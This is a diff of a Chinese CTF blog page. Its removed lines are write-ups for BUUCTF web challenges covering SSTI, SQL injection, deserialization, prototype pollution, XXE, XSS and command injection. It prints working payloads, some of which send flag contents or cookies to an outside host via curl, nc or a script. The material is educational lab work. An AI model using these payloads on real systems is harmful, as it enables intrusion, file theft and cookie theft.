-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return process.mainModule.require&amp;#40;'child_process'&amp;#41;.execSync&amp;#40;'cat /flag'&amp;#41;.toString&amp;#40;&amp;#41;</span><br></pre></td></tr></table></figure>
-
-<p>成功获得flag。</p>
-<h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>F12发现Django，模板注入，过滤了&#123;&#123;&#125;&#125;使用&#123;% if … %&#125;&#123;% endif %&#125;绕过，但是很多关键字被过滤了，看了一下别的师傅WP，发现时黑名单逻辑问题&#40;坑，不给源码&#41;</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">'import'</span>, <span class="string">'getattr'</span>, <span class="string">'os'</span>, <span class="string">'class'</span>, <span class="string">'subclasses'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'if'</span>, <span class="string">'for'</span>,</span><br><span class="line">                 <span class="string">' subprocess'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>, <span class="string">'popen'</span>, <span class="string">'builtins'</span>, <span class="string">'compile'</span>, <span class="string">'execfile'</span>, <span class="string">'from_pyfile'</span>, <span class="string">'local'</span>,</span><br><span class="line">                 <span class="string">'self'</span>, <span class="string">'item'</span>, <span class="string">'getitem'</span>, <span class="string">'getattribute'</span>, <span class="string">'func_globals'</span>, <span class="string">'config'</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s = s.replace&amp;<span class="comment">#40;no, ''&amp;#41;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
-
-<p>可以这样绕过，imposort，只要被替换为空的值再自身的前面就可以，但是最好用的还是最后一项config，因为它在所有黑名单的后面。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% iconfigf &apos;&apos;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__&amp;#40;&amp;#41;[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen&amp;#40;&apos;curl http://ip:port/ -d `cat /flag_1s_Hera`;&apos;&amp;#41; %&amp;#125;1&amp;#123;% endiconfigf %&amp;#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><p>长度被限制，不可见字符也被限制了，所以只能用亦或拼凑处<code>$_GET $pi=&amp;#40;is_nan^&amp;#40;6&amp;#41;.&amp;#40;4&amp;#41;&amp;#41;.&amp;#40;tan^&amp;#40;1&amp;#41;.&amp;#40;5&amp;#41;&amp;#41;;</code></p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=&amp;#40;is_nan^&amp;#40;6&amp;#41;.&amp;#40;4&amp;#41;&amp;#41;.&amp;#40;tan^&amp;#40;1&amp;#41;.&amp;#40;5&amp;#41;&amp;#41;;$pi=$$pi;$pi&amp;#123;0&amp;#125;&amp;#40;$pi&amp;#123;1&amp;#125;&amp;#41;&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure>
-
-<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>随便点点发现一个接口，疑似sql注入，试了一下果然是联合注入，扫荡以下表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?search=olympus_mons%20union%20select%20&amp;#40;select group_concat&amp;#40;table_name&amp;#41; from information_schema.tables where table_schema=database&amp;#40;&amp;#41;&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806</span><br></pre></td></tr></table></figure>
-
-<p>没发现可以的表，扫荡一下库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?search=olympus_mons%20union%20select%20&amp;#40;select group_concat&amp;#40;schema_name&amp;#41; from information_schema.schemata&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806</span><br></pre></td></tr></table></figure>
-
-<p>发现alien_code库，里面有code字段，是flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/query?search=olympus_mons%20union%20select%20&amp;#40;select code from alien_code.code&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806</span><br></pre></td></tr></table></figure>
-
-<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>弱密码admin/password加入后台，读取一下源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=home</span><br></pre></td></tr></table></figure>
-
-<p>发现只允许以upload、home结尾才可以读取，审计以下upload.php，发现存在phar反序列化漏洞，首先随便上传一个文件，获取文件路径和<code>$_session[user]</code>。</p>
-<p>![image-20201108172108685]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201108172108685.png&#41;</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span>&amp;#123;</span></span><br><span class="line">    public $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>&amp;#40</span>;&amp;<span class="comment">#41;&amp;#123;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="string">"GXY33ab688d4f7951f53ff12e76befb21a9"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd=<span class="string">"highlight_file&amp;#40;'/var/www/html/flag.php'&amp;#41;;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Filename=<span class="string">"1"</span>;</span><br><span class="line">    &amp;<span class="comment">#125;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Uploader&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar&amp;<span class="comment">#40;"phar.phar"&amp;#41;;</span></span><br><span class="line">$phar-&gt;startBuffering&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line">$phar-&gt;setStub&amp;<span class="comment">#40;"&lt;?php __HALT_COMPILER&amp;#40;&amp;#41;; ?&gt;"&amp;#41;; //设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata&amp;<span class="comment">#40;$a&amp;#41;; //将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString&amp;<span class="comment">#40;"test.txt", "test"&amp;#41;; //添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>生成phar文件，上传phar文件。</p>
-<p>由于我们要在在file_get_contents处触发反序列化，所以我们继续随便上传一个文件，并传入name参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://之前获取的文件路径</span><br></pre></td></tr></table></figure>
-
-<p>即可触发反序列化漏洞。</p>
-<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>打开源码就是一个明显的merge函数的原型链污染，注册的时候用了toUpperCase函数，在toUpperCase&#40;&#41;函数中，字符ı会转变为I，所以直接注册一个ADıIN就自动变成了ADMIN，我们可以看到info路由中返回了一个outputFunctionName，是没有被定义过的，在看到ejs模板中的<code>&lt;%=user%&gt;</code>，那就是污染outputFunctionName，让ejs模板执行javascript代码RCE。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;&quot;test&quot;:&quot;1&quot;,&quot;__proto__&quot;:&amp;#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.require&amp;#40;&apos;child_process&apos;&amp;#41;.execSync&amp;#40;&apos;cat /flag&apos;&amp;#41;.toString&amp;#40;&amp;#41;//&quot;&amp;#125;&amp;#125;</span><br><span class="line"></span><br><span class="line">;return global[process].mainModule.require&amp;#40;&apos;child_process&apos;&amp;#41;.execSync&amp;#40;&apos;cat /flag&apos;&amp;#41;.toString&amp;#40;&amp;#41;//</span><br></pre></td></tr></table></figure>
-
-<h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><p>考点是Typecho反序列化漏洞，审计一下代码，在install.php中找到了两处反序列化点。</p>
-<p>![image-20201110115041051]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201110115041051.png&#41;</p>
-<p>这一处因为没有session，所以不能使用，只能看第二处。</p>
-<p>![image-20201110115110344]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201110115110344.png&#41;</p>
-<p>触发条件是存在GET start参数，将cookie[‘__typecho_config’]反序列化，但是想到达这里还需要过一处Reffer检验。</p>
-<p>![image-20201110115234196]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201110115234196.png&#41;</p>
-<p>将Reffere头设置为同站即可绕过，链子很简单，感兴趣可以自己挖，后续会在我的博客代码审计专题中详细介绍Typecho反序列化漏洞。</p>
-<p>poc:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class">&amp;#123;</span></span><br><span class="line">    private $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Construct</span>&amp;#40</span>;&amp;<span class="comment">#41;&amp;#123;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type=<span class="string">'RSS 2.0'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="string">'author'</span>]=<span class="keyword">array</span>&amp;<span class="comment">#40;"author"=&gt;new Typecho_Request&amp;#40;&amp;#41;&amp;#41;;</span></span><br><span class="line"></span><br><span class="line">    &amp;<span class="comment">#125;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class">&amp;#123;</span></span><br><span class="line">    private $_params = array&amp;#40;&amp;#41;;</span><br><span class="line">    <span class="keyword">private</span> $_filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Construct</span>&amp;#40</span>;&amp;<span class="comment">#41;&amp;#123;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>]=<span class="string">'cat /flag'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter=[<span class="string">'system'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;link=<span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title=<span class="string">"2"</span>;</span><br><span class="line">    &amp;<span class="comment">#125;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br><span class="line">$a=<span class="keyword">array</span>&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line">$a[<span class="string">'adapter'</span>]=<span class="keyword">new</span> Typecho_Feed&amp;<span class="comment">#40;&amp;#41;;</span></span><br><span class="line">$a=serialize&amp;<span class="comment">#40;$a&amp;#41;;</span></span><br><span class="line">$b=base64_encode&amp;<span class="comment">#40;$a&amp;#41;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
-
-<h2 id="第一章-web入门-afr-3"><a href="#第一章-web入门-afr-3" class="headerlink" title="[第一章 web入门]afr_3"></a>[第一章 web入门]afr_3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/article?name=article</span><br></pre></td></tr></table></figure>
-
-<p>在name处可以进行任意文件读取，不过没有权限读取flag，尝试读取源码，读取/proc/self/cmdline发现存在server.py，但是不知道当前目录路径，可以通过/proc/self/cmd获得当前路径。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/article?name=../../../../proc/self/cmd/server.py</span><br></pre></td></tr></table></figure>
-
-<p>读到源码，发现存在key.py，设置了secretkey=key，读取一波secretkey</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = &apos;Drmhze6EPcv0fN_81Bj-nA&apos;</span><br></pre></td></tr></table></figure>
-
-<p>在源码中发现可以控制session中n1code的值来进行模板注入，我们也得到了secretkey。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if session[&apos;n1code&apos;] is not None:</span><br><span class="line">    template = &apos;&apos;&apos;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&apos;t look at our &amp;lt;a href=&apos;/article?name=article&apos;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &apos;&apos;&apos; % session[&apos;n1code&apos;]</span><br><span class="line">    session[&apos;n1code&apos;] = None</span><br></pre></td></tr></table></figure>
-
-<p>直接伪造session，读取flag.py。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;&apos;n1code&apos;: &apos;&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__&amp;#40;&amp;#41;[40]&amp;#40;\&apos;./flag.py\&apos;&amp;#41;.read&amp;#40;&amp;#41;&amp;#125;&amp;#125;&apos;&amp;#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p>赤裸裸的session伪造，有下载路由，那就下载看看session用的什么引擎处理session。</p>
-<p>![image-20201112143845534]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201112143845534.png&#41;</p>
-<p>发现是用的php_binary引擎，那就用该引擎生成一个username=admin的session。</p>
-<p>题目中的文件名格式是首先拼接文件名，然后拼接<code>_</code>+hash_file，那么我们让文件名为sess,计算一下hash_file即可得到文件名。</p>
-<p>上传后会检查是否存在<code>/var/babyctf/success.txt</code>，使用的是file_exists函数，但是该函数的作用是检测函数或者目录是否存在，所以我们需要创建一个success.txt目录来绕过，那么就让attr=success.txt，随便上传一个文件即可绕过。</p>
-<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>题目给出源码，要满足finfo_file判断为png，同时getimagesize判断不为png。</p>
-<p>![image-20201112151849282]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201112151849282.png&#41;</p>
-<p>上传一张这样的图片即可绕过。</p>
-<h2 id="第二章-web进阶-死亡ping命令"><a href="#第二章-web进阶-死亡ping命令" class="headerlink" title="[第二章 web进阶]死亡ping命令"></a>[第二章 web进阶]死亡ping命令</h2><p>首先fuzz一下过滤了啥，发现能用的字符只有<code>&lt;&gt;/</code>，但是这些就够了，首先我们需要一个命令分隔符，<code>%0a</code>刚好满足条件</p>
-<p>![image-20201119155659182]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201119155659182.png&#41;</p>
-<p>发现成功执行ls命令，但是却没有回显，所以只能想办法将结果带出来，可以看到<code>&gt;</code>可以使用，所以我们可以使用curl命令远程下载一个sh文件，然后在本地执行，在我们的服务器web目录下放置一个1.sh，内容如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /F* |nc ip port</span><br></pre></td></tr></table></figure>
-
-<p>然后提交</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0acurl ip/1.sh &gt; /tmp/1.sh</span><br></pre></td></tr></table></figure>
-
-<p>修改一下<code>/tmp/1.sh</code>权限，使得它可以执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0achmod 777 /tmp/1.sh</span><br></pre></td></tr></table></figure>
-
-<p>最后在我们的服务器上监听端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp ip port</span><br></pre></td></tr></table></figure>
-
-<p>提交</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1%0ash /tmp/1.sh</span><br></pre></td></tr></table></figure>
-
-<p>即可带出flag</p>
-<h1 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h1><p>打开题目，访问upload路由发现权限不够，html页面有个404，发现访问到不存在路由时，会在请求头中返回cookie值，里面有secretkey，可以通过伪造cookie id=1,进入upload路由，在html代码中得到源码，发现在上传压缩包后，对压缩包进行解压缩，然后打开压缩包中的文件，在showflag路由中可以看到flag文件在flask目录下的flag/flag.jpg中，查看师傅们的WP发现，这里可以用软链接创建压缩包，然后让程序去打开软链接，就会自动定位到flag.jpg。</p>
-<p>执行下面的目录，建立一个指向flag.jpg的软路由test，/proc/self/cwd为当前目录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg test</span><br></pre></td></tr></table></figure>
-
-<p>然后使用压缩目录将他压缩为压缩包，上传文件，抓包得到flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -ry test.zip test</span><br></pre></td></tr></table></figure>
-
-<p>![image-20201123204354248]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201123204354248.png&#41;</p>
-<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>一个SVG的XXE，提交下面的SVG，就能看到flag，flag在当前目录的flag.txt中。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE svg [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot;&gt; ]&gt; </span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">    &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![image-20201123210124396]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201123210124396.png&#41;</p>
-<h2 id="某入群题-Web2"><a href="#某入群题-Web2" class="headerlink" title="[某入群题]Web2"></a>[某入群题]Web2</h2><p>登录使用with rollup构造token为空绕过判定。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin\&amp;password=||1 group by token with  rollup limit 1 offset 2 ;  --+&amp;question=1</span><br></pre></td></tr></table></figure>
-
-<p>进入后台，发现一个数据库连接的东东，应该是mysql服务端伪造了，原理和Redis服务端伪造一样的，mysql服务端伪造主要是使用<code>load data local infile</code>进行任意文件读取，但是现在不知道flag的位置。</p>
-<p>在json.php中发现，会列出name参数的目录</p>
-<p>![image-20201128000425882]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201128000425882.png&#41;</p>
-<p>但是在后台点开文件，路径却是<code>WebShell大马/webshell/</code>,应该是拼接了webshell。</p>
-<p>![image-20201128000510021]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201128000510021.png&#41;</p>
-<p>通过访问头看到，PHP为5.2.17,这个版本存在一个%00字符串截断的问题。</p>
-<p>![image-20201128000241825]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201128000241825.png&#41;</p>
-<p>所以在json.php中可以进行目录穿越，并用%00截断拼接的webshell，读取到路径，得到flag。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/page/json.php?dt=alldata&amp;name=Webshell大马/../../../../../../%00&amp;page=1&amp;limit=15</span><br></pre></td></tr></table></figure>
-
-<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>抓包提交发现是以json的数据格式发送至服务器解析，我们可以通过修改Content-Type=application/xml，使服务器解析XML格式的数据，所以这里考点就是一个盲注的XXE，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1&lt;/message&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>一个xss，过滤了等于号括号之类的，需要将内容html编码，拿出payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;eval&amp;#40;&amp;#34;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#56;&amp;#46;&amp;#49;&amp;#50;&amp;#57;&amp;#46;&amp;#54;&amp;#57;&amp;#46;&amp;#56;&amp;#53;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#63;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#34;&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>将cookie leak出来。</p>
-<p>![image-20201128175030199]&#40;G:\MyBlog\source\images\BUUCTF3\image-20201128175030199.png&#41;</p>
-<p>访问admin.php，发现一个sql注入点，亦或注入，拿到flag。</p>
-<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p>利用.htaccess自包含执行PHP代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system&amp;#40;&apos;cat%20%2Fflag&apos;&amp;#41;%3B%3F%3E%0A%23%5C</span><br></pre></td></tr></table></figure>
-
+<p>我们就能控制原型链中的任意值，由于newvalue的值是以path作为键在requests.body中找值，由于path已经被拼接，所以newvalue的值无法控制，只能为空。</p>
 
       
 
@@ -404,6 +227,17 @@
       
       
       
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/专题-writeup//" class="article-tag-list-link color2">专题  writeup</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
       
 
@@ -453,7 +287,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/10/16/BUUCTF3/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/11/03/湖湘杯&xnuca复现/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -467,18 +301,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/10/20/nu1lctf2020/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/11/21/祥云杯/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Nu1lCtf2020
+          祥云杯
         
       </div>
     </a>
   
   
-    <a href="/2020/10/12/西湖论剑/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">西湖论剑赛后复现</div>
+    <a href="/2020/10/29/BUUCTF3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">BUUCTF2</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -497,6 +331,19 @@
             </div>
         </div>
         
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
